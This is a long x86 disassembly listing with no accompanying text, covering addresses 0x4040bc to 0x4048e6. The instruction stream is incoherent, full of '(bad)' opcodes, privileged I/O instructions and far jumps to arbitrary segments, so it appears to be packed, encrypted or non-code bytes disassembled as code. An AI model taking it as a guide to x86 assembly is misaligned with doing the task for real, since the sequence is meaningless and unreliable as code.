  4040bc:	mov    BYTE PTR [ecx+0x7ffbca75],dh
  4040c2:	sbb    eax,0xf902e546
  4040c7:	jae    0x404126
  4040c9:	loop   0x4040ed
  4040cb:	push   eax
  4040cc:	and    bl,BYTE PTR [ecx-0x3d]
  4040cf:	popf   
  4040d0:	out    0x5d,eax
  4040d2:	adc    eax,0x4c441265
  4040d7:	xor    ah,BYTE PTR ds:0xcebd12c6
  4040dd:	add    al,0x63
  4040df:	shr    BYTE PTR [edi+edi*8+0xb5f4675],1
  4040e6:	out    0xbf,al
  4040e8:	imul   edi,DWORD PTR [edx-0x1b],0x3f
  4040ec:	imul   DWORD PTR [esi-0x2ed7949c]
  4040f2:	aaa    
  4040f3:	pusha  
  4040f4:	aas    
  4040f5:	inc    eax
  4040f6:	scas   eax,DWORD PTR es:[edi]
  4040f7:	xor    DWORD PTR ds:0x2563bc9,esi
  4040fd:	sar    ebx,cl
  4040ff:	(bad)  
  404101:	(bad)  
  404103:	sub    eax,DWORD PTR [edi+ebp*1+0x71fb3932]
  40410a:	jnp    0x40416f
  40410c:	shl    esi,0xc
  40410f:	loopne 0x4040d4
  404111:	imul   edx,esi,0xffffffd9
  404114:	lahf   
  404115:	mov    al,0x2d
  404117:	cmp    ah,BYTE PTR [esi+0x25]
  40411a:	sub    ch,dh
  40411c:	mov    esp,DWORD PTR [esi+ecx*8-0x1ff1f39a]
  404123:	sbb    eax,0x890dc040
  404128:	call   0xf0e1136d
  40412d:	iret   
  40412e:	ret    0xf771
  404131:	pushf  
  404132:	dec    ebp
  404133:	adc    DWORD PTR [edx+0x33048678],0x8
  40413a:	adc    esp,DWORD PTR [ecx]
  40413c:	aaa    
  40413d:	push   ecx
  40413e:	dec    ecx
  40413f:	or     DWORD PTR [ebx-0xb],ebx
  404142:	pushf  
  404143:	int3   
  404144:	mov    cl,0xe6
  404146:	xor    bl,BYTE PTR [esi-0x2d029a45]
  40414c:	retf   
  40414d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40414e:	push   esp
  40414f:	dec    ecx
  404150:	jecxz  0x404122
  404152:	add    al,BYTE PTR ds:0xc462450a
  404158:	cli    
  404159:	xchg   ebp,eax
  40415a:	clc    
  40415b:	jmp    0x368f:0x30f6806
  404162:	call   edx
  404164:	pop    ecx
  404165:	jnp    0x4041df
  404167:	mov    ebx,0x9b5bef13
  40416c:	jecxz  0x404173
  40416e:	test   BYTE PTR [ebx-0x54c1b45e],bl
  404174:	push   ds
  404175:	jp     0x404186
  404177:	xchg   ebx,eax
  404178:	ds push ds
  40417a:	fadd   QWORD PTR [ebx]
  40417c:	sti    
  40417d:	ins    DWORD PTR es:[edi],dx
  40417e:	out    0x52,eax
  404180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404181:	fs dec esi
  404183:	adc    DWORD PTR [ebx],esi
  404185:	jb     0x404180
  404187:	(bad)  
  404188:	hlt    
  404189:	jne    0x4041be
  40418b:	imul   esi,DWORD PTR [eax+0x656c9d72],0xfffffffb
  404192:	xchg   edx,eax
  404193:	rcl    dh,1
  404195:	mov    edx,0x6cb22f12
  40419a:	mov    edi,0x95516c9e
  40419f:	aaa    
  4041a0:	mov    edx,0x8e143278
  4041a5:	enter  0x7fa4,0xca
  4041a9:	mov    dh,0x6b
  4041ab:	outs   dx,DWORD PTR ds:[esi]
  4041ac:	push   0xb6e9e1d6
  4041b1:	lahf   
  4041b2:	xlat   BYTE PTR ds:[ebx]
  4041b3:	pop    ebp
  4041b4:	(bad)  
  4041b5:	rcr    BYTE PTR [edx-0x20],0xc
  4041b9:	pop    ss
  4041ba:	inc    esp
  4041bb:	push   0x3cb5c3d2
  4041c0:	arpl   WORD PTR [edx-0x77],di
  4041c3:	adc    eax,0xe3f2c5d2
  4041c8:	mov    dh,0xd0
  4041ca:	xchg   BYTE PTR [edx],bh
  4041cc:	les    edx,FWORD PTR [esi+0x52]
  4041cf:	dec    edx
  4041d0:	sub    dl,dh
  4041d2:	ds jmp 0x8ee6:0x80e086fa
  4041da:	adc    ch,al
  4041dc:	push   0x29
  4041de:	mov    ecx,0x6457ecdb
  4041e3:	popf   
  4041e4:	sbb    bl,BYTE PTR [eax+0x4ee6e61d]
  4041ea:	jle    0x404219
  4041ec:	fist   WORD PTR [eax-0x116e042c]
  4041f2:	jmp    0xb722:0xad0dc590
  4041f9:	ins    DWORD PTR es:[edi],dx
  4041fa:	adc    eax,0x6500b2a6
  4041ff:	rcl    DWORD PTR [ebx+eax*1],1
  404202:	mov    ch,0xba
  404204:	jno    0x4041cc
  404206:	cld    
  404207:	push   edi
  404208:	ret    0x9993
  40420b:	jmp    0x9a1:0xcb73328d
  404212:	call   0xccba4b06
  404217:	mov    dl,0x22
  404219:	lea    ecx,[eax-0x64]
  40421c:	cmp    dh,BYTE PTR [ebp-0xe9c14a1]
  404222:	pop    ss
  404223:	(bad)  
  404224:	mov    ah,0xd8
  404226:	cmp    dl,bh
  404228:	in     al,dx
  404229:	lock push ebp
  40422b:	fidivr WORD PTR [ebp+eax*8-0x6649d9c0]
  404232:	jmp    0xad3500d
  404237:	push   esp
  404238:	test   BYTE PTR [eax-0x7d],al
  40423b:	clc    
  40423c:	inc    eax
  40423d:	mov    DWORD PTR ds:0x42fe6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	(bad)  
  404259:	dec    ecx
  40425a:	cmp    BYTE PTR [edi+0x7070184f],cl
  404260:	cmp    eax,0x4470707d
  404265:	daa    
  404266:	sub    DWORD PTR [edi],ebp
  404268:	je     0x40428b
  40426a:	mov    eax,ds:0x61bd678a
  40426f:	mov    bl,0x18
  404271:	call   0x78a53273
  404276:	ret    
  404277:	push   esi
  404278:	push   eax
  404279:	loope  0x4042c9
  40427b:	test   DWORD PTR [esi-0x57],edx
  40427e:	xlat   BYTE PTR ds:[ebx]
  40427f:	pop    edi
  404280:	mov    dl,0x49
  404282:	(bad)  
  404283:	int3   
  404284:	inc    ebp
  404285:	pop    ds
  404286:	xchg   bl,bl
  404288:	cmp    BYTE PTR [esi+0x42],ah
  40428b:	fwait
  40428c:	jbe    0x404293
  40428e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40428f:	(bad)  [edi-0x3d]
  404292:	ds inc edi
  404294:	mov    dl,0xa2
  404296:	sub    al,0xfe
  404298:	cli    
  404299:	cmp    al,0x84
  40429b:	and    eax,0x4d9e452e
  4042a0:	loopne 0x40424a
  4042a2:	cs xchg esp,eax
  4042a4:	and    ebp,DWORD PTR [esi+0x232432b5]
  4042aa:	or     eax,0xeeda3181
  4042af:	sub    bl,BYTE PTR [ecx+ebx*8-0x3b]
  4042b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042b4:	hlt    
  4042b5:	test   sp,bx
  4042b8:	mov    cl,0x9
  4042ba:	rcl    DWORD PTR [edx-0x53],cl
  4042bd:	add    al,0xe4
  4042bf:	out    dx,eax
  4042c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042c1:	push   ss
  4042c2:	xchg   edx,eax
  4042c3:	mov    DWORD PTR [ecx],ecx
  4042c5:	hlt    
  4042c6:	scas   eax,DWORD PTR es:[edi]
  4042c7:	stos   DWORD PTR es:[edi],eax
  4042c8:	sbb    edi,edx
  4042ca:	ins    DWORD PTR es:[edi],dx
  4042cb:	and    eax,DWORD PTR [edx-0x1475e590]
  4042d1:	jae    0x404319
  4042d3:	retf   0xc046
  4042d6:	pop    esp
  4042d7:	add    DWORD PTR [ebp+0x7fcee315],edx
  4042dd:	jl     0x40432b
  4042df:	xchg   BYTE PTR [ebp+0x11],dh
  4042e2:	in     al,0xff
  4042e4:	pop    ebx
  4042e5:	iret   
  4042e6:	(bad)  ds:0xa974f42
  4042ec:	sbb    bh,BYTE PTR [eax+0x634e0be4]
  4042f2:	add    DWORD PTR ds:0x92a37a0c,esp
  4042f8:	mov    ?,WORD PTR [eax+0x52]
  4042fb:	gs into 
  4042fd:	retf   0xba23
  404300:	pop    ds
  404301:	inc    ebx
  404302:	in     eax,dx
  404303:	loope  0x4042ef
  404305:	pop    edx
  404306:	lods   eax,DWORD PTR ds:[esi]
  404307:	pushw  es
  404309:	test   BYTE PTR [esi+0x1f],0x86
  40430d:	xchg   edi,eax
  40430e:	loope  0x4042de
  404310:	pop    esp
  404311:	test   al,0xac
  404313:	dec    esi
  404314:	xchg   ecx,eax
  404315:	push   ebx
  404316:	pusha  
  404317:	jg     0x404349
  404319:	iret   
  40431a:	ret    0xb1e9
  40431d:	mov    dl,0xff
  40431f:	or     eax,0x639456e
  404324:	cmp    BYTE PTR [ecx],dl
  404326:	pop    ecx
  404327:	cld    
  404328:	es leave 
  40432a:	push   ebx
  40432b:	cmp    eax,0xfa78e772
  404330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404331:	mov    ecx,0xd03440a2
  404336:	mov    eax,0x459b1fc6
  40433b:	adc    eax,0xbec8a110
  404340:	pop    ss
  404341:	jl     0x4042ca
  404343:	cwde   
  404344:	in     eax,0x4d
  404346:	jbe    0x4042cb
  404348:	mov    WORD PTR [edi-0x5b],fs
  40434b:	adc    ecx,DWORD PTR [ebx-0x1bc8ee9c]
  404351:	mov    bl,0x6d
  404353:	(bad)  
  404354:	sti    
  404355:	ret    
  404356:	push   esi
  404357:	xchg   edx,eax
  404358:	push   di
  40435a:	or     DWORD PTR [eax+0x64f60b6e],0xfffffff1
  404361:	push   ebp
  404362:	lods   eax,DWORD PTR ds:[esi]
  404363:	inc    eax
  404364:	out    0xd1,eax
  404366:	adc    edx,DWORD PTR [ebx+0x123ce22e]
  40436c:	cmp    edx,DWORD PTR [edx]
  40436e:	fs loopne 0x40438b
  404371:	loop   0x4043b2
  404373:	xor    DWORD PTR [ebx],0x5e4ad22c
  404379:	ja     0x404327
  40437b:	dec    ecx
  40437c:	mov    ds:0xed38bfe3,al
  404381:	sbb    eax,0x467bd19
  404386:	enter  0xa7a9,0x1
  40438a:	mov    edx,0x2c8ad5e3
  40438f:	shl    BYTE PTR [esi-0x3d],cl
  404392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404393:	push   edx
  404394:	xor    BYTE PTR ds:0xd4b6ee22,ah
  40439a:	and    esi,ecx
  40439c:	and    BYTE PTR [edx+ecx*8+0x749fd2ee],dh
  4043a3:	and    DWORD PTR [edx-0x9],ecx
  4043a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043a7:	aad    0x4c
  4043a9:	in     al,0x5f
  4043ab:	mov    ds:0x57a06e4f,eax
  4043b0:	jmp    0x1197946b
  4043b5:	icebp  
  4043b6:	loopne 0x4043b0
  4043b8:	xor    al,0x60
  4043ba:	int    0x93
  4043bc:	and    eax,0xb091d069
  4043c1:	rol    BYTE PTR [ebx],0x86
  4043c4:	jl     0x404435
  4043c6:	scas   al,BYTE PTR es:[edi]
  4043c7:	int    0x80
  4043c9:	mov    edi,0x12b59cb8
  4043ce:	mov    al,0x1a
  4043d0:	xor    edi,edx
  4043d2:	mov    eax,0xd0c43092
  4043d7:	inc    ebx
  4043d8:	sbb    eax,0xd141164b
  4043dd:	xchg   ebx,eax
  4043de:	mov    ds:0x2260d67,eax
  4043e3:	push   es
  4043e4:	sub    ebp,DWORD PTR [ebx-0x72dec70d]
  4043ea:	gs mov eax,0xdfbc04ba
  4043f0:	or     ah,ah
  4043f2:	cwde   
  4043f3:	or     eax,0xac436241
  4043f8:	xor    al,0x1c
  4043fa:	mov    ?,WORD PTR [ebx+0x5f74c45f]
  404400:	pop    esp
  404401:	jne    0x404404
  404403:	fmul   st,st(5)
  404405:	cmp    esi,DWORD PTR [edi+0x4fb46c0c]
  40440b:	inc    esi
  40440c:	call   0xf16f:0x9c484de9
  404413:	pop    ebp
  404414:	ret    0x2326
  404417:	ins    BYTE PTR es:[edi],dx
  404418:	jmp    0xa8fb:0xfaad40ea
  40441f:	mov    bl,cl
  404421:	arpl   WORD PTR [esp+esi*8-0x61],bx
  404425:	arpl   WORD PTR [ebx+0x21aaad3],si
  40442b:	mov    al,ds:0x1c67b6a2
  404430:	adc    ch,BYTE PTR [ecx+0xd]
  404433:	xchg   edi,eax
  404434:	test   BYTE PTR [eax+0x75167146],ch
  40443a:	and    dh,BYTE PTR [eax-0x70ed6b00]
  404440:	shr    BYTE PTR [esi+0x699b6a74],0x0
  404447:	or     eax,0xaa4d7522
  40444c:	add    BYTE PTR [edi-0x38],bl
  40444f:	mov    BYTE PTR [edx-0x13a03e5f],dl
  404455:	push   es
  404456:	fs mov ebp,0x93fff306
  40445c:	fstp   DWORD PTR [eax-0x59883271]
  404462:	mov    ebx,0x3e5973cf
  404467:	inc    edi
  404468:	mov    esp,DWORD PTR [edi+eiz*2-0xd4551a3]
  40446f:	sbb    DWORD PTR [eax-0x31808d23],eax
  404475:	shl    bl,cl
  404477:	enter  0xbf23,0x16
  40447b:	xchg   ebx,eax
  40447c:	sub    al,0x5d
  40447e:	ret    0x9828
  404481:	xchg   BYTE PTR [ecx-0x78a0541c],bl
  404487:	test   eax,0x91a9bbf1
  40448c:	imul   ebp,esp,0x364f987a
  404492:	push   ss
  404493:	sub    DWORD PTR [edi],ebp
  404495:	sbb    al,0x5a
  404497:	leave  
  404498:	stc    
  404499:	dec    esi
  40449a:	cmp    ebx,DWORD PTR [edx+0x8e1e0dc]
  4044a0:	push   edi
  4044a1:	mov    al,ds:0x6b086a
  4044a6:	ds std 
  4044a8:	mov    ch,0x96
  4044aa:	dec    edi
  4044ab:	adc    BYTE PTR [ebx+0x5b10a74d],bl
  4044b1:	mov    ebx,0x5985dee0
  4044b6:	icebp  
  4044b7:	std    
  4044b8:	push   ebp
  4044b9:	push   ebx
  4044ba:	or     eax,0x6e239a18
  4044bf:	mov    edi,0x2e62484f
  4044c4:	lods   eax,DWORD PTR ds:[esi]
  4044c5:	cmp    ebp,DWORD PTR [ecx]
  4044c7:	mov    al,0x4d
  4044c9:	repnz xchg ecx,eax
  4044cb:	stos   DWORD PTR es:[edi],eax
  4044cc:	or     ebp,ecx
  4044ce:	mov    ecx,0xcde8a1f
  4044d3:	add    ah,BYTE PTR [edi+edi*2-0x2c]
  4044d7:	jg     0x40449f
  4044d9:	push   eax
  4044da:	add    ebx,DWORD PTR [ecx-0xa0497fc]
  4044e0:	inc    edx
  4044e1:	jmp    0x16486926
  4044e6:	stos   DWORD PTR es:[edi],eax
  4044e7:	mov    ecx,0x588b7ba6
  4044ec:	jl     0x4044d9
  4044ee:	dec    esi
  4044ef:	jp     0x4044c4
  4044f1:	out    0x71,eax
  4044f3:	mov    ah,dl
  4044f5:	pusha  
  4044f6:	cmp    BYTE PTR [edx-0x1e],0x65
  4044fa:	mov    esp,0xfe4ef461
  4044ff:	fsub   QWORD PTR [eax-0x7194732e]
  404505:	repnz push ebx
  404507:	push   edx
  404508:	push   cs
  404509:	and    BYTE PTR [esi+0x57],bl
  40450c:	(bad)  
  40450d:	repnz ds push ebp
  404510:	paddsb mm7,QWORD PTR [ebp+edi*2+0x27]
  404515:	cld    
  404516:	xlat   BYTE PTR ds:[ebx]
  404517:	mov    eax,ds:0x8e511127
  40451c:	xchg   ebx,eax
  40451d:	dec    ecx
  40451e:	mov    edx,0x3ab252d5
  404523:	iret   
  404524:	inc    eax
  404525:	xchg   ebp,eax
  404526:	sub    edi,DWORD PTR [ebp+edi*2+0x43]
  40452a:	pop    edx
  40452b:	int3   
  40452c:	mov    cl,0x9c
  40452e:	in     al,0xee
  404530:	test   al,0xbf
  404532:	add    eax,0xfd1f9a64
  404537:	mov    ds:0x43842efc,al
  40453c:	xchg   BYTE PTR ds:0x65107450,al
  404542:	push   0x3
  404544:	mov    al,ds:0xffee77af
  404549:	fldln2 
  40454b:	sahf   
  40454c:	pop    ds
  40454d:	xor    eax,0x5a358b11
  404552:	and    eax,0xad0949c5
  404557:	repz push edi
  404559:	fwait
  40455a:	adc    bh,BYTE PTR [edx-0x6b35fe13]
  404560:	xor    ch,BYTE PTR [edx]
  404562:	or     al,BYTE PTR [edi+0x6d]
  404565:	adc    DWORD PTR [edx],ebx
  404567:	clc    
  404568:	mov    edx,?
  40456a:	jo     0x404567
  40456c:	lea    esi,[esi+ecx*2]
  40456f:	int    0xc3
  404571:	inc    esi
  404572:	add    DWORD PTR [ebx+ebp*1],edi
  404575:	std    
  404576:	xor    eax,0x7fa70ac1
  40457b:	cli    
  40457c:	sbb    ebp,DWORD PTR [eax-0x2f]
  40457f:	jns    0x4045b9
  404581:	scas   eax,DWORD PTR es:[edi]
  404582:	xor    BYTE PTR [ebx+ebx*2],ch
  404585:	inc    esp
  404586:	pop    ecx
  404587:	loopne 0x4045e2
  404589:	xchg   ecx,eax
  40458a:	ins    DWORD PTR es:[edi],dx
  40458b:	pop    ebx
  40458c:	push   ecx
  40458d:	into   
  40458e:	mov    bl,0x7d
  404590:	pop    edi
  404591:	push   ebp
  404592:	pop    ebp
  404593:	std    
  404594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404596:	sbb    DWORD PTR [edi+0x7aec819a],eax
  40459c:	test   DWORD PTR [ebx-0x3f3d652f],ecx
  4045a2:	inc    edx
  4045a3:	inc    esp
  4045a5:	pop    eax
  4045a6:	mov    BYTE PTR [edi],cl
  4045a8:	adc    BYTE PTR [ecx],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fe82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	push   ds
  4045c8:	mov    bl,0x57
  4045ca:	inc    esp
  4045cb:	or     al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xcc70707d
  4045d4:	jl     0x404578
  4045d6:	dec    edi
  4045d7:	ins    BYTE PTR es:[edi],dx
  4045d8:	mov    al,0xe6
  4045da:	jg     0x40457a
  4045dc:	lahf   
  4045dd:	dec    ebx
  4045de:	or     DWORD PTR [edx+0x5ab9db9c],ecx
  4045e4:	imul   ebp,DWORD PTR [ebp-0x451ec691],0x3fb54c35
  4045ee:	out    0x91,eax
  4045f0:	js     0x404627
  4045f2:	adc    eax,0x8deff64e
  4045f7:	jecxz  0x404586
  4045f9:	mov    bh,0x6e
  4045fb:	cmc    
  4045fc:	imul   esi,edx,0x4a
  4045ff:	jmp    0xd55e9269
  404604:	sbb    ebp,DWORD PTR [edx-0x80]
  404607:	mov    WORD PTR [edi],fs
  404609:	lea    ebx,[bx+si+0x7882]
  40460e:	gs xor eax,0x35e17781
  404614:	mov    bl,0xa8
  404616:	jmp    0x9d3b5127
  40461b:	fwait
  40461c:	lahf   
  40461d:	pop    es
  40461e:	rcr    BYTE PTR [esi+0x28733438],cl
  404624:	sbb    esi,edx
  404626:	inc    eax
  404627:	sub    ecx,DWORD PTR [ebx+0x79]
  40462a:	sahf   
  40462b:	add    edi,0x9f05b604
  404631:	jp     0x4045c4
  404633:	dec    ecx
  404634:	das    
  404635:	xchg   BYTE PTR [eax+0x7c],ch
  404638:	xor    cl,ch
  40463a:	ins    BYTE PTR es:[edi],dx
  40463b:	push   esi
  40463c:	mov    dh,BYTE PTR [edx]
  40463e:	jbe    0x404618
  404640:	mov    edi,0x8e6e0056
  404645:	cmp    dl,BYTE PTR [esi+eax*1-0x66]
  404649:	jb     0x404693
  40464b:	ins    DWORD PTR es:[edi],dx
  40464c:	not    DWORD PTR [eax+0x345ef3f3]
  404652:	dec    esi
  404653:	std    
  404654:	pop    ecx
  404655:	(bad)  
  404656:	fst    DWORD PTR [ecx+edx*2+0x270861b2]
  40465d:	or     edx,ecx
  40465f:	push   ecx
  404660:	pop    es
  404661:	fsub   QWORD PTR [eax+0x4c6a3ef4]
  404667:	mov    BYTE PTR [ebx+0x2e25631],0x8a
  40466e:	call   0x3683:0x65d7d4e7
  404675:	les    ebp,FWORD PTR es:[eax-0x7a90ec7a]
  40467c:	ficomp WORD PTR [bp+si+0x52]
  404680:	push   cs
  404681:	pop    esi
  404682:	(bad)  
  404683:	xchg   ebx,eax
  404684:	jg     0x4046e4
  404686:	and    al,0x3d
  404688:	dec    edx
  404689:	sahf   
  40468a:	push   0x2a8fddc9
  40468f:	pop    ebp
  404690:	xchg   edx,eax
  404691:	xchg   edi,eax
  404692:	inc    ecx
  404693:	cmp    BYTE PTR cs:[eax+ecx*1-0x3f],ah
  404698:	mov    esi,0xb91baa
  40469d:	xor    al,0x31
  40469f:	clc    
  4046a0:	pop    esi
  4046a1:	js     0x40463b
  4046a3:	jg     0x40462b
  4046a5:	repnz test eax,0x731d5104
  4046ab:	jp     0x4046c6
  4046ad:	out    dx,al
  4046ae:	stc    
  4046af:	adc    bh,BYTE PTR [eax*1-0x317e322e]
  4046b6:	pop    ebx
  4046b7:	xchg   ebx,eax
  4046b8:	sub    ecx,esp
  4046ba:	bound  ebx,QWORD PTR [ecx]
  4046bc:	(bad)  
  4046bd:	push   eax
  4046be:	adc    eax,0x602eae85
  4046c3:	pop    esp
  4046c4:	(bad)  
  4046c5:	loope  0x40473c
  4046c7:	dec    edx
  4046c8:	jecxz  0x4046ac
  4046ca:	loop   0x40468b
  4046cc:	(bad)  
  4046cd:	jns    0x404731
  4046cf:	jmp    0x8ca70720
  4046d4:	push   ss
  4046d5:	or     DWORD PTR [edx-0x76],esi
  4046d8:	lds    eax,FWORD PTR [esp+eax*1+0x1f]
  4046dc:	rcr    BYTE PTR [ebx+esi*8+0x41],cl
  4046e0:	(bad)  
  4046e1:	mov    edx,0xc66eec27
  4046e6:	push   ds
  4046e7:	xchg   DWORD PTR [eax-0x28b7c0e5],esi
  4046ed:	adc    DWORD PTR [ebx+esi*2-0x5c4a6d83],esp
  4046f4:	or     eax,0x21692e85
  4046f9:	test   eax,0x8d35290d
  4046fe:	je     0x4046d6
  404700:	dec    ebp
  404701:	xchg   ebx,eax
  404702:	mov    ecx,eax
  404704:	clc    
  404705:	repnz mov al,0xbf
  404708:	inc    esi
  404709:	(bad)  
  40470b:	adc    eax,0x179a796b
  404710:	retf   
  404711:	sbb    al,0xd7
  404713:	inc    ecx
  404714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404715:	stos   DWORD PTR es:[edi],eax
  404716:	jne    0x40476d
  404718:	dec    ecx
  404719:	in     eax,0x0
  40471b:	sbb    DWORD PTR [eax+0x34],edi
  40471e:	vpmacsdqh ymm11,ymm6,ymm0,YMMWORD PTR [ebp+0x2d]
  404725:	mov    ds:0x862c02c4,al
  40472a:	nop
  40472b:	adc    DWORD PTR [ebx],ebx
  40472d:	mov    eax,ds:0x8c31142d
  404732:	cmp    esi,DWORD PTR [ecx]
  404734:	fdiv   DWORD PTR [edx]
  404736:	repz jae 0x4047a5
  404739:	aam    0x90
  40473b:	sahf   
  40473c:	or     ebx,DWORD PTR [ecx-0x5d1772fc]
  404742:	sub    BYTE PTR [edi+0x11],cl
  404745:	jnp    0x404752
  404747:	aad    0x22
  404749:	outs   dx,DWORD PTR gs:[esi]
  40474b:	popa   
  40474c:	xor    DWORD PTR [edx-0x51662f1b],eax
  404752:	pop    ebp
  404753:	mov    ah,0xbc
  404755:	psubq  mm5,QWORD PTR [ebp-0x5]
  404759:	ror    DWORD PTR [ecx-0x2c04fba8],cl
  40475f:	xlat   BYTE PTR ds:[ebx]
  404761:	imul   esi,DWORD PTR [ebx-0x2],0x1e
  404765:	je     0x4046fa
  404767:	in     al,0x1b
  404769:	adc    eax,0xf5e0e856
  40476e:	or     esi,DWORD PTR [edx+edi*8]
  404771:	fdivr  QWORD PTR [edx]
  404773:	ficom  WORD PTR [esi+0x33493baf]
  404779:	add    bh,BYTE PTR [ebp+0x4]
  40477c:	or     dh,cl
  40477e:	jmp    0x2a05:0xc3c2d10d
  404785:	pushf  
  404786:	mov    ebp,0x33c29eca
  40478b:	push   esp
  40478c:	data16 ja 0x4047fd
  40478f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404790:	inc    esp
  404791:	xchg   ebp,eax
  404792:	popa   
  404793:	mov    eax,ds:0x4362c92d
  404798:	adc    BYTE PTR [ebp+0x31],bl
  40479b:	pushf  
  40479c:	mov    ah,0xa3
  40479e:	sbb    BYTE PTR [eax+0x4db3cd38],cl
  4047a4:	mov    bh,0x95
  4047a6:	push   es
  4047a7:	call   0x40cd:0x891f2a8f
  4047ae:	mov    edi,0x49869e86
  4047b3:	sahf   
  4047b4:	cmp    ebx,ebp
  4047b6:	cwde   
  4047b7:	cs sub edx,0x10
  4047bb:	es stc 
  4047bd:	pop    edi
  4047be:	mov    esi,DWORD PTR [ebx-0x6a898e05]
  4047c4:	(bad)  [eax-0x156679e5]
  4047ca:	xchg   edx,eax
  4047cb:	fs fsub st,st(3)
  4047ce:	xor    edi,ebx
  4047d0:	repnz dec ebp
  4047d2:	jbe    0x4047aa
  4047d4:	cmp    DWORD PTR [edi],ebx
  4047d6:	call   0xe50f:0xb99f825a
  4047dd:	int    0x76
  4047df:	xchg   DWORD PTR [ebp+0x36],edi
  4047e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047e3:	xchg   esp,eax
  4047e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047e5:	pop    edx
  4047e6:	and    bl,BYTE PTR [edi+0x5d552947]
  4047ec:	sub    ah,cl
  4047ee:	cwde   
  4047ef:	scas   eax,DWORD PTR es:[edi]
  4047f0:	ret    0xa2a4
  4047f3:	push   edx
  4047f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047f5:	aas    
  4047f6:	stos   DWORD PTR es:[edi],eax
  4047f7:	add    cl,BYTE PTR [ebp-0x6b]
  4047fa:	xor    bl,BYTE PTR [esp+eax*8-0x1f479dff]
  404801:	lods   eax,DWORD PTR ds:[esi]
  404802:	jge    0x4047a2
  404804:	jle    0x404846
  404806:	adc    BYTE PTR [edi+0x5],dl
  404809:	jmp    0x37daaa3b
  40480e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404810:	clc    
  404811:	outs   dx,DWORD PTR ds:[esi]
  404812:	(bad)  
  404813:	in     al,dx
  404814:	in     al,dx
  404815:	mov    eax,0xf464444a
  40481a:	dec    ebp
  40481b:	xchg   ecx,eax
  40481c:	cmp    eax,0x40810198
  404821:	mov    ds:0x486e916d,eax
  404826:	mov    ds:0xfb36b7f9,al
  40482b:	sub    BYTE PTR [eax-0x5056998c],dl
  404831:	imul   ecx,DWORD PTR ds:0x39fce468,0x1ef015d3
  40483b:	addps  xmm5,XMMWORD PTR [edx+esi*8]
  40483f:	xor    bl,BYTE PTR ds:0x9e0baee
  404845:	xchg   esi,eax
  404846:	jae    0x404817
  404848:	dec    edx
  404849:	aaa    
  40484a:	xor    BYTE PTR [eax+0x52],bh
  40484d:	mov    al,ds:0xd3e11f91
  404852:	ins    BYTE PTR es:[edi],dx
  404853:	leave  
  404854:	scas   eax,DWORD PTR es:[edi]
  404855:	pusha  
  404856:	dec    esi
  404857:	mov    ah,0xeb
  404859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40485a:	xchg   BYTE PTR [ebp-0x5d],bl
  40485d:	sar    BYTE PTR [ebx+0x6fcea0c6],1
  404863:	inc    ebp
  404864:	(bad)  
  404865:	xlat   BYTE PTR ds:[ebx]
  404866:	or     al,0x30
  404868:	mov    ss,WORD PTR [ebx-0x201d3ba4]
  40486e:	xor    BYTE PTR [esi-0x74e7e311],0xce
  404875:	call   0x33931964
  40487a:	or     BYTE PTR [ebp+edx*4-0x40],0xd9
  40487f:	and    eax,eax
  404881:	sub    eax,0x95361282
  404886:	leave  
  404887:	rcr    DWORD PTR [esi-0xf],1
  40488a:	cdq    
  40488b:	mov    edx,0x5753e54a
  404890:	(bad)  
  404891:	add    eax,0x4978fccf
  404896:	icebp  
  404897:	iret   
  404898:	nop
  404899:	sub    bh,BYTE PTR [ebp-0x673b7bb7]
  40489f:	sar    DWORD PTR [edi+0x25],cl
  4048a2:	cmp    BYTE PTR ds:0xcdc39dce,ch
  4048a8:	mov    dl,0xb8
  4048aa:	jb     0x4048df
  4048ac:	add    BYTE PTR [ecx],cl
  4048ae:	mov    bh,0xb8
  4048b0:	hlt    
  4048b1:	repz mov ebp,0x414b45d4
  4048b7:	mov    WORD PTR ds:0x31bfd870,fs
  4048bd:	scas   al,BYTE PTR es:[edi]
  4048be:	push   esp
  4048bf:	jns    0x404843
  4048c1:	sub    eax,0x3cf85cdc
  4048c6:	rol    BYTE PTR [bp+si-0x58],1
  4048ca:	dec    esp
  4048cb:	ins    DWORD PTR es:[edi],dx
  4048cc:	or     DWORD PTR [ecx+ecx*4],0xffffffd4
  4048d0:	fstp   st(4)
  4048d2:	jb     0x404864
  4048d4:	(bad)  
  4048d5:	cdq    
  4048d6:	div    DWORD PTR [esi]
  4048d8:	pop    ds
  4048d9:	into   
  4048da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048db:	test   eax,0x4c25e8fd
  4048e0:	ins    DWORD PTR es:[edi],dx
  4048e1:	mov    al,0x6f
  4048e3:	push   eax
  4048e4:	jb     0x4048db
  4048e6:	add    BYTE PTR [eax],cl
